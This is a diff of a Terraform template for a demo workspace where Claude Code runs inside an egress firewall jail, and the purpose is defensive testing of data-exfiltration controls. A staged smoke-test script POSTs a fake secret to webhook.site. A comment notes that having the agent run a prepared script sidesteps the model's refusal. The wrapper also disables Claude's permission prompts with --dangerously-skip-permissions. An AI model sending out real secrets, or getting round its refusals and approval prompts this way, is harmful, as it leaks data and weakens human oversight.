@@ -1,59 +1,49 @@
 # =============================================================================
 # Firewalled Claude Code on Coder Agents, GovCloud demo workspace template
 # =============================================================================
-# Identical to the claude-code template, with the Coder Boundary agent
-# firewall enabled. Claude Code runs inside a process-level network egress
-# jail (landjail / Landlock LSM) that enforces an HTTP(S) allowlist. The
-# agent can reach the in-boundary AI Gateway and the in-cluster GitLab, and
-# every other egress is denied and audit-logged. This is the data-exfil /
-# DLP guardrail story for the AOI.
+# Claude Code runs inside a process-level network egress jail
+# (landjail / Landlock LSM) that enforces an HTTP(S) allowlist. The agent
+# can reach the in-boundary AI Gateway and the in-cluster GitLab, and every
+# other egress is denied and audit-logged. This is the data-exfil / DLP
+# guardrail story for the AOI.
 #
-# Boundary wiring (claude-code module 4.7.3 inputs):
-#   - enable_boundary       = true     wraps Claude Code with the firewall.
-#   - use_boundary_directly = true     installs the standalone boundary
-#     binary (MIT) instead of the `coder boundary` subcommand. The subcommand
-#     path needs a logged-in coder CLI session (license check); the agent has
-#     only an agent token, so the standalone binary is the reliable path.
-#   - The module adds no --allow / --jail-type flags, so the allowlist and
-#     jail type come from ~/.config/coder_boundary/config.yaml. That file is
-#     rendered from boundary.config.yaml.tftpl and written by
-#     pre_install_script; BOUNDARY_CONFIG + BOUNDARY_JAIL_TYPE agent env vars
-#     make boundary load it and use landjail reliably.
+# Install method (adapted from the Red Hat Summit 2026 demo,
+# coder/demo-aigov-rhaiis-rhsummit-2026): everything is done directly in the
+# agent startup_script, NOT via the claude-code registry module.
+#   1. Claude Code CLI: native install into ~/.local/bin
+#      (curl https://claude.ai/install.sh | bash -s -- stable).
+#   2. boundary (Coder Agent Firewall): standalone binary
+#      (curl .../coder/boundary/main/install.sh | bash).
+#   3. Allowlist written to ~/.config/coder_boundary/config.yaml, rendered
+#      from the sibling boundary.config.yaml.tftpl.
+#   4. ~/.claude/settings.json + ~/.claude.json pre-seeded so first-run
+#      onboarding / trust dialogs are skipped and the AI Gateway endpoint is
+#      already configured.
+#   5. A boundary wrapper at ~/.local/bin/boundary-wrappers/claude exec's
+#      `boundary --config <cfg> --jail-type landjail -- <real claude>
+#      --dangerously-skip-permissions "$@"`. The wrappers dir is prepended
+#      to PATH in the shell rc files, so `claude` is jailed by default.
+#      `--dangerously-skip-permissions` is what removes Claude's interactive
+#      permission / bypass-mode prompts: boundary IS the security boundary
+#      here, so the per-tool approval prompts are redundant friction.
 #
-# Allowlist (boundary.config.yaml.tftpl): adapted from the Red Hat Summit
-# 2026 demo (coder/demo-aigov-rhaiis-rhsummit-2026), which uses Claude
-# Code's default allowed domains (package managers, GitHub, container
-# registries, cloud SDKs) plus this deployment's Coder host and the
-# in-cluster GitLab. npm is intentionally omitted so `npm install` is the
-# obvious DENY in the demo. jail_type landjail needs no added capabilities
-# (AL2023 kernel 6.18 exceeds the Landlock 6.7 floor; landlock is in the
-# node LSM stack).
+# There is intentionally NO AgentAPI / Coder Tasks wiring in this template.
+# Claude Code is driven interactively from the workspace terminal (or
+# code-server), wrapped by boundary. Codex/OpenAI is also intentionally
+# omitted: this is a Claude-only firewall demo.
 #
-# Runs Claude Code as a Coder Agent inside a Kubernetes pod on the EKS
-# cluster. Claude Code is wired through the Coder AI Gateway (AI Bridge)
-# so the workspace never holds a raw Anthropic key: requests are proxied
-# through Coder using the workspace owner's session token and routed to
-# the configured provider (Anthropic-direct primary / Bedrock secondary)
-# in-boundary.
+# Allowlist (boundary.config.yaml.tftpl): Claude Code's default allowed
+# domains (package managers, GitHub, container registries, cloud SDKs) plus
+# this deployment's Coder host and the in-cluster GitLab. npm is
+# intentionally omitted so `npm install` is the obvious DENY in the demo.
+# jail_type landjail needs no added pod capabilities (AL2023 kernel exceeds
+# the Landlock 6.7 floor; landlock is in the node LSM stack).
 #
-# Launching this template as a Coder Task surfaces the Claude Code chat UI
-# (via the bundled AgentAPI app) and seeds the agent with the task prompt.
-#
-# VERSION / INPUT NAMING, verified against the Coder registry:
-#   - claude-code module is pinned to 4.7.3 (the version in
-#     deploy/CONVENTIONS.md / versions.lock.yaml).
-#   - In 4.7.3 the AI Gateway input is named `enable_aibridge` (NOT
-#     `enable_ai_gateway`). The `enable_ai_gateway` rename landed in the
-#     5.x line, which also REMOVED the bundled AgentAPI integration and
-#     the `task_app_id` output that `coder_ai_task` depends on. Staying on
-#     4.7.3 is what makes the Coder Tasks wiring below possible.
-#   - `enable_aibridge = true` makes the module set, on the agent:
-#       ANTHROPIC_BASE_URL = <access_url>/api/v2/aibridge/anthropic
-#       CLAUDE_API_KEY     = <workspace owner session token>
-#     With CODER_ACCESS_URL=https://dev.usgov.coderdemo.io the base URL
-#     resolves to https://dev.usgov.coderdemo.io/api/v2/aibridge/anthropic.
-#   - We additionally export ANTHROPIC_AUTH_TOKEN (session token) to match
-#     the AI Gateway client contract in deploy/CONVENTIONS.md.
+# AI access: Claude Code authenticates through the Coder AI Gateway (AI
+# Bridge) using the workspace owner's session token, so the workspace never
+# holds a raw Anthropic key. ANTHROPIC_BASE_URL points at
+# <access_url>/api/v2/aibridge/anthropic and CLAUDE_API_KEY /
+# ANTHROPIC_AUTH_TOKEN carry the session token.
 #
 # See README.md for the end-to-end AI Gateway wiring and cluster
 # prerequisites (namespace + provisioner RBAC).
@@ -63,8 +53,6 @@ terraform {
   required_providers {
     coder = {
       source = "coder/coder"
-      # `data.coder_task` and `coder_ai_task.app_id` require provider >= 2.13.0.
-      version = ">= 2.13.0"
     }
     kubernetes = {
       source  = "hashicorp/kubernetes"
@@ -100,8 +88,9 @@ variable "namespace" {
 # codercom/enterprise-base is Coder's maintained Kubernetes workspace base
 # image: runs as user `coder` (uid 1000), ships git/curl/sudo, and is the
 # canonical base for Coder's official Kubernetes template. Claude Code and
-# AgentAPI install as standalone binaries into $HOME/.local/bin, so no
-# Node.js/npm is required in the base image.
+# boundary install as standalone binaries (Claude into $HOME/.local/bin,
+# boundary into /usr/local/bin via sudo), so no Node.js/npm is required in
+# the base image.
 variable "workspace_image" {
   type        = string
   description = "Fully-qualified workspace image. Defaults to the ECR-mirrored codercom/enterprise-base."
@@ -115,10 +104,6 @@ provider "kubernetes" {
 data "coder_provisioner" "me" {}
 data "coder_workspace" "me" {}
 data "coder_workspace_owner" "me" {}
-
-# Populated when the workspace is created as a Coder Task. `enabled` is
-# false for a normal workspace build, and `prompt` carries the task prompt.
-data "coder_task" "me" {}
 
 # -----------------------------------------------------------------------------
 # Git external auth: in-cluster GitLab (in-boundary)
@@ -139,7 +124,7 @@ data "coder_external_auth" "gitlab" {
 }
 
 # -----------------------------------------------------------------------------
-# Parameters: sizing and the AI task prompt
+# Parameters: sizing
 # -----------------------------------------------------------------------------
 
 data "coder_parameter" "cpu" {
@@ -211,28 +196,13 @@ data "coder_parameter" "disk_size" {
   }
 }
 
-# Fallback prompt for non-Task workspace builds. When the workspace is
-# launched as a Coder Task, data.coder_task.me.prompt takes precedence.
-data "coder_parameter" "ai_prompt" {
-  name         = "ai_prompt"
-  display_name = "Initial AI Prompt"
-  description  = "Seed prompt for Claude Code. Ignored when launched as a Coder Task (the Task prompt is used instead)."
-  type         = "string"
-  default      = ""
-  mutable      = true
-  icon         = "/icon/claude.svg"
-}
-
 locals {
-  # Prefer the Coder Task prompt; fall back to the parameter for plain builds.
-  effective_prompt = data.coder_task.me.prompt != "" ? data.coder_task.me.prompt : data.coder_parameter.ai_prompt.value
-
-  # For documentation/readme parity. The claude-code module derives the
-  # same value internally from data.coder_workspace.me.access_url.
+  # AI Gateway (AI Bridge) Anthropic endpoint, proxied through Coder and
+  # authenticated with the workspace owner's session token.
   ai_gateway_anthropic_url = "${data.coder_workspace.me.access_url}/api/v2/aibridge/anthropic"
 
   # Coder access URL host, substituted into the boundary allowlist so the
-  # agent can reach the AI Gateway, AgentAPI, and the workspace agent.
+  # agent can reach the AI Gateway and the workspace agent.
   coder_host = replace(replace(data.coder_workspace.me.access_url, "https://", ""), "http://", "")
 
   # Agent firewall allowlist, rendered from the sibling
@@ -241,6 +211,42 @@ locals {
   boundary_config_yaml = templatefile("${path.module}/boundary.config.yaml.tftpl", {
     coder_host = local.coder_host
   })
+
+  # Claude Code settings.json, written to ~/.claude/settings.json. Sets the
+  # AI Gateway endpoint, the git author/committer identity (no secrets: the
+  # GitLab OAuth token is injected by Coder's git credential helper, never
+  # written to the workspace), and onboarding flags so the CLI starts
+  # without the first-run prompts.
+  claude_settings = {
+    env = {
+      ANTHROPIC_BASE_URL  = local.ai_gateway_anthropic_url
+      GIT_AUTHOR_NAME     = coalesce(data.coder_workspace_owner.me.full_name, data.coder_workspace_owner.me.name)
+      GIT_AUTHOR_EMAIL    = data.coder_workspace_owner.me.email
+      GIT_COMMITTER_NAME  = coalesce(data.coder_workspace_owner.me.full_name, data.coder_workspace_owner.me.name)
+      GIT_COMMITTER_EMAIL = data.coder_workspace_owner.me.email
+    }
+    autoUpdaterStatus            = "disabled"
+    hasAcknowledgedCostThreshold = true
+    hasCompletedOnboarding       = true
+  }
+
+  # Claude Code config, written to ~/.claude.json. Carries per-project
+  # onboarding/trust state so the workspace dir is trusted on first launch.
+  # Auth is NOT set here: the AI Gateway credential is ANTHROPIC_AUTH_TOKEN
+  # (set via coder_env below). Setting a primaryApiKey here too would make
+  # Claude Code see both a bearer token and a "/login managed key" and warn
+  # about an auth conflict.
+  claude_config = {
+    autoUpdaterStatus            = "disabled"
+    hasAcknowledgedCostThreshold = true
+    hasCompletedOnboarding       = true
+    projects = {
+      "/home/coder" = {
+        hasCompletedProjectOnboarding = true
+        hasTrustDialogAccepted        = true
+      }
+    }
+  }
 }
 
 # -----------------------------------------------------------------------------
@@ -251,21 +257,156 @@ resource "coder_agent" "main" {
   arch = data.coder_provisioner.me.arch
   os   = "linux"
 
-  # Claude Code + AgentAPI are installed by the claude-code module's own
-  # coder_script (native binaries into $HOME/.local/bin). This startup
-  # script only normalizes PATH and signals readiness.
+  # The startup script runs on every workspace start. It:
+  #   1. Installs Claude Code (native, ~/.local/bin) and boundary.
+  #   2. Writes the boundary allowlist config.
+  #   3. Writes Claude Code config (settings.json + .claude.json).
+  #   4. Generates the boundary wrapper for `claude` and prepends the
+  #      wrappers dir to PATH in the shell rc files.
+  #   5. Stages operator firewall smoke-test scripts under ~/demo/.
   startup_script = <<-EOT
     #!/bin/bash
-    set -e
     touch ~/.bashrc
-    grep -qF '$HOME/.local/bin' ~/.profile 2>/dev/null || \
+
+    # Native installs land in ~/.local/bin. Put it on PATH for this script
+    # and for future login shells.
+    export PATH="$HOME/.local/bin:$PATH"
+    grep -qF "$HOME/.local/bin" ~/.profile 2>/dev/null || \
       echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.profile
+
+    # Install Claude Code CLI (native install into ~/.local/bin).
+    # Installer syntax: bash -s -- [stable|latest|VERSION]. `stable` tracks
+    # the current stable channel; pin a VERSION here for a reproducible build.
+    echo "Installing Claude Code CLI (stable)..."
+    curl -fsSL https://claude.ai/install.sh | bash -s -- stable || echo "Warning: Claude Code install failed"
+
+    # Install Coder Agent Firewall (boundary). The standalone binary has no
+    # license/login dependency, unlike the `coder boundary` subcommand which
+    # needs a logged-in CLI session (the agent only carries an agent token).
+    echo "Installing Agent Firewall (boundary)..."
+    curl -fsSL https://raw.githubusercontent.com/coder/boundary/main/install.sh | bash || echo "Warning: boundary install failed"
+
+    # Write boundary allowlist to ~/.config/coder_boundary/config.yaml.
+    # boundary v0.9.0 does NOT auto-discover this path: the wrapper passes
+    # --config explicitly and BOUNDARY_CONFIG is set on the agent (coder_env)
+    # so direct `boundary -- <cmd>` calls also load the allowlist. The
+    # base64 round-trip keeps the multi-line YAML intact inside the heredoc.
+    echo "Configuring Agent Firewall..."
+    mkdir -p ~/.config/coder_boundary /tmp/boundary_logs
+    echo '${base64encode(local.boundary_config_yaml)}' | base64 -d > ~/.config/coder_boundary/config.yaml
+    chmod 600 ~/.config/coder_boundary/config.yaml
+
+    # Claude Code configuration: settings.json (AI Gateway env + onboarding
+    # flags) and .claude.json (session-token primaryApiKey + project trust).
+    echo "Configuring Claude Code..."
+    mkdir -p ~/.claude
+    cat > ~/.claude/settings.json << 'CLAUDESETTINGS'
+    ${jsonencode(local.claude_settings)}
+    CLAUDESETTINGS
+    cat > ~/.claude.json << 'CLAUDECONFIG'
+    ${jsonencode(local.claude_config)}
+    CLAUDECONFIG
+
+    # Boundary wrapper: make `claude` resolve to a boundary-jailed launcher.
+    # The wrapper exec's `boundary --config <cfg> --jail-type landjail --
+    # <real claude> --dangerously-skip-permissions "$@"`. Prepending the
+    # wrappers dir to PATH means `claude` hits the wrapper first; the real
+    # binary is still reachable by absolute path (e.g.
+    # /home/coder/.local/bin/claude) for debugging.
+    #   --config: boundary v0.9.0 doesn't auto-discover the allowlist path.
+    #   --jail-type landjail: use the Landlock LSM (no network namespace,
+    #     iptables, or added capabilities) rather than the nsjail default.
+    #   --dangerously-skip-permissions: boundary IS the security boundary, so
+    #     Claude's interactive permission / bypass-mode prompts are removed.
+    echo "Installing boundary wrapper for claude..."
+    WRAPPERS_DIR="$HOME/.local/bin/boundary-wrappers"
+    mkdir -p "$WRAPPERS_DIR"
+    REAL_CLAUDE="$(command -v claude 2>/dev/null || true)"
+    if [ -n "$REAL_CLAUDE" ]; then
+      printf '#!/usr/bin/env bash\nexec boundary --config "$HOME/.config/coder_boundary/config.yaml" --jail-type landjail -- %q --dangerously-skip-permissions "$@"\n' "$REAL_CLAUDE" > "$WRAPPERS_DIR/claude"
+      chmod +x "$WRAPPERS_DIR/claude"
+      echo "  claude -> boundary -- $REAL_CLAUDE --dangerously-skip-permissions"
+    else
+      echo "  skip claude wrapper (claude not installed)"
+    fi
+
+    # Prepend the wrappers dir to PATH in every common interactive shell rc
+    # so `claude` runs jailed by default. BOUNDARY_CONFIG / BOUNDARY_JAIL_TYPE
+    # are set on the agent (coder_env) so they cover non-login shells too.
+    for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.zprofile"; do
+      touch "$RC"
+      grep -qF 'boundary-wrappers' "$RC" || \
+        echo 'export PATH="$HOME/.local/bin/boundary-wrappers:$PATH"' >> "$RC"
+    done
+
+    # Pre-stage operator firewall smoke-test scripts so a demo operator can
+    # verify boundary is in the network path. Each runs a deliberately
+    # off-allowlist request that boundary should drop. Asking the agent to
+    # "run this script" sidesteps the model's refusal path: it isn't crafting
+    # an exfil command, it's running a file the operator already placed.
+    echo "Staging Agent Firewall demo scripts..."
+    mkdir -p "$HOME/demo"
+
+    cat > "$HOME/demo/exfil-test.sh" << 'EXFILDEMO'
+    #!/usr/bin/env bash
+    # Attempts a POST to webhook.site. Host is NOT on the Agent Firewall
+    # allowlist, so boundary drops the connection and the script fails. Run
+    # via: boundary -- ~/demo/exfil-test.sh (or ask an agent to run it).
+    set -e
+    UUID="$(uuidgen 2>/dev/null || date +%s)"
+    echo "Attempting POST to https://webhook.site/$UUID ..."
+    curl -sS -X POST -d 'SECRET=fake-api-key-abc123' "https://webhook.site/$UUID"
+    echo
+    echo "Unexpected: POST succeeded. Is boundary in PATH?"
+    EXFILDEMO
+    chmod +x "$HOME/demo/exfil-test.sh"
+
+    cat > "$HOME/demo/unknown-registry-test.sh" << 'PIPDEMO'
+    #!/usr/bin/env bash
+    # Attempts a pip install from an index URL that isn't on the allowlist.
+    # Boundary drops the connection; pip fails with a resolver error.
+    # Simulates a typosquat / malicious-mirror attack.
+    set -e
+    echo "Attempting pip install from unapproved mirror..."
+    pip install --dry-run --index-url https://unknown-pypi.example.com/simple suspicious-pkg
+    echo "Unexpected: resolver succeeded. Is boundary installed?"
+    PIPDEMO
+    chmod +x "$HOME/demo/unknown-registry-test.sh"
+
+    cat > "$HOME/demo/README.md" << 'DEMOREADME'
+    # Operator firewall smoke tests
+
+    These scripts let a demo operator verify boundary is in the network path
+    BEFORE walking an audience through the agent-facing parts of the demo.
+    Tail /tmp/boundary_logs/ in another terminal to watch DENY events land.
+
+    ## ~/demo/exfil-test.sh
+    POST to webhook.site (NOT on the allowlist). Boundary drops the
+    connection; curl fails. Expected exit code != 0.
+
+    ## ~/demo/unknown-registry-test.sh
+    pip install from a non-allowlisted --index-url. Boundary drops the
+    resolver request; pip fails. Expected exit code != 0.
+
+    ## Test the inverse (allowed hosts)
+    Run, from the same terminal:
+
+      curl -sI https://api.github.com | head -1      # expect HTTP/2 200
+      pip install --dry-run requests                 # expect success
+    DEMOREADME
+
     echo "=== Workspace ready ==="
   EOT
 
   env = {
     EDITOR = "code"
     VISUAL = "code"
+
+    # AI Gateway (AI Bridge) Anthropic endpoint. Claude Code reads
+    # ANTHROPIC_BASE_URL to know where to send requests; ANTHROPIC_API_BASE
+    # is the same value for clients that read that name instead.
+    ANTHROPIC_BASE_URL = local.ai_gateway_anthropic_url
+    ANTHROPIC_API_BASE = local.ai_gateway_anthropic_url
 
     # No docker socket in the pod; opt out of devcontainer auto-detection
     # so the dashboard does not hang polling `docker ps`.
@@ -308,12 +449,13 @@ resource "coder_agent" "main" {
 # -----------------------------------------------------------------------------
 # AI Gateway client auth
 # -----------------------------------------------------------------------------
-# The claude-code module (enable_aibridge = true) already sets
-# ANTHROPIC_BASE_URL and CLAUDE_API_KEY. We additionally export
-# ANTHROPIC_AUTH_TOKEN with the workspace owner's session token to match
-# the AI Gateway client contract documented in deploy/CONVENTIONS.md. Both
-# carry the same session token, so there is no conflict; no raw Anthropic
-# API key is ever placed in the workspace.
+# Claude Code authenticates to the AI Gateway with the workspace owner's
+# session token (no raw Anthropic key in the workspace). ANTHROPIC_AUTH_TOKEN
+# is the single credential, matching the AI Gateway client contract in
+# deploy/CONVENTIONS.md (ANTHROPIC_BASE_URL + ANTHROPIC_AUTH_TOKEN). We do
+# NOT also set CLAUDE_API_KEY or a ~/.claude.json primaryApiKey: Claude Code
+# treats the env token as a bearer token and an API key / managed key as a
+# separate credential, and warns "Auth conflict" when both are present.
 resource "coder_env" "anthropic_auth_token" {
   agent_id = coder_agent.main.id
   name     = "ANTHROPIC_AUTH_TOKEN"
@@ -325,8 +467,8 @@ resource "coder_env" "anthropic_auth_token" {
 # -----------------------------------------------------------------------------
 # boundary v0.9.0 no longer auto-discovers ~/.config/coder_boundary/config.yaml,
 # so point it at the rendered config explicitly and pin landjail. These env
-# vars are read by both the module-launched `boundary -- claude` and any
-# manual `boundary -- <cmd>` run in a workspace terminal.
+# vars are read by any `boundary -- <cmd>` run in a workspace terminal,
+# including direct invocations that don't go through the claude wrapper.
 resource "coder_env" "boundary_config" {
   agent_id = coder_agent.main.id
   name     = "BOUNDARY_CONFIG"
@@ -340,88 +482,8 @@ resource "coder_env" "boundary_jail_type" {
 }
 
 # -----------------------------------------------------------------------------
-# Claude Code (Coder registry module) + Coder Task
+# Coder registry modules
 # -----------------------------------------------------------------------------
-
-module "claude_code" {
-  source   = "registry.coder.com/coder/claude-code/coder"
-  version  = "4.7.3"
-  agent_id = coder_agent.main.id
-
-  # Required by the module: directory Claude Code runs in. Pre-created and
-  # trust-accepted by the module.
-  workdir = "/home/coder"
-
-  # Route Claude Code through the Coder AI Gateway (AI Bridge) instead of
-  # talking to api.anthropic.com directly. Sets ANTHROPIC_BASE_URL +
-  # CLAUDE_API_KEY (session token) on the agent. Mutually exclusive with
-  # claude_api_key / claude_code_oauth_token.
-  enable_aibridge = true
-
-  # ---------------------------------------------------------------------------
-  # Coder Boundary agent firewall (this is the "firewalled" variant)
-  # ---------------------------------------------------------------------------
-  # Wrap Claude Code in a process-level network egress jail. The module
-  # launches boundary as a wrapper around the claude process, denying all
-  # egress except the allowlist below. landjail uses the Landlock LSM and
-  # needs no added pod capabilities.
-  enable_boundary = true
-
-  # Install the standalone boundary binary (MIT) rather than using the
-  # `coder boundary` subcommand. The subcommand verifies the deployment
-  # license via an authenticated client; the agent only carries an agent
-  # token (no user session), so the subcommand path errors with "not logged
-  # in". The standalone binary has no license/login dependency.
-  use_boundary_directly = true
-  boundary_version      = "latest"
-
-  # The 4.7.3 module passes no --allow / --jail-type flags to boundary, so
-  # the allowlist and jail type come ONLY from
-  # ~/.config/coder_boundary/config.yaml. That file is rendered from the
-  # sibling boundary.config.yaml.tftpl (Red Hat Summit 2026 allowlist) and
-  # written here, before Claude Code starts. The BOUNDARY_CONFIG and
-  # BOUNDARY_JAIL_TYPE agent env vars (below) make boundary load it reliably
-  # and use landjail even though boundary v0.9.0 dropped config
-  # auto-discovery. The base64 round-trip keeps the multi-line YAML intact
-  # inside the heredoc. Allowing the Coder host is REQUIRED: it is the AI
-  # Gateway egress Claude Code depends on. Everything not listed is denied
-  # and audited (npm is intentionally omitted as the demo DENY).
-  pre_install_script = <<-EOT
-    #!/bin/bash
-    set -e
-    mkdir -p "$HOME/.config/coder_boundary" /tmp/boundary_logs
-    cfg="$HOME/.config/coder_boundary/config.yaml"
-    echo '${base64encode(local.boundary_config_yaml)}' | base64 -d > "$cfg"
-    chmod 600 "$cfg"
-    echo "[firewalled] wrote boundary config ($(grep -c '^  - ' "$cfg") allow rules)"
-  EOT
-
-  # Coder Tasks: seed the agent and report task status to the Coder UI via
-  # AgentAPI. Empty string for plain builds -> Claude Code starts idle.
-  ai_prompt    = local.effective_prompt
-  report_tasks = true
-
-  # Serve the Claude Code web app on a subdomain. Requires the wildcard
-  # access URL (*.usgov.coderdemo.io) configured on the Coder server.
-  subdomain = true
-
-  # Model selection is intentionally left at the module default. With the
-  # AI Gateway, the requested model name must match the active provider:
-  #   - Anthropic-direct (primary): an Anthropic model id, e.g.
-  #     "claude-sonnet-4-5-20250929".
-  #   - Bedrock (secondary): the GovCloud inference profile, e.g.
-  #     "us-gov.anthropic.claude-sonnet-4-5-20250929-v1:0".
-  # Pin one explicitly only after confirming which provider is live:
-  # model = "claude-sonnet-4-5-20250929"
-}
-
-# Marks this workspace build as a Coder AI Task and binds the Task UI to the
-# Claude Code AgentAPI app. Only created in a Task context so normal
-# workspace builds are unaffected.
-resource "coder_ai_task" "claude_code" {
-  count  = data.coder_task.me.enabled ? data.coder_workspace.me.start_count : 0
-  app_id = module.claude_code.task_app_id
-}
 
 # code-server: VS Code in the browser (an additional coder_app tile).
 module "code_server" {
@@ -492,10 +554,9 @@ resource "kubernetes_pod_v1" "workspace" {
       security_context {
         run_as_user = 1000
         # enterprise-base grants the coder user passwordless sudo. The
-        # claude-code/agentapi module installs the agentapi binary to
-        # /usr/local/bin via sudo, which requires privilege escalation.
-        # Disabling it sets the kernel no_new_privs flag and breaks that
-        # install (and the Coder Tasks chat UI it powers).
+        # boundary install.sh places the boundary binary in /usr/local/bin
+        # via sudo, which requires privilege escalation. Disabling it sets
+        # the kernel no_new_privs flag and breaks that install.
         allow_privilege_escalation = true
       }
 
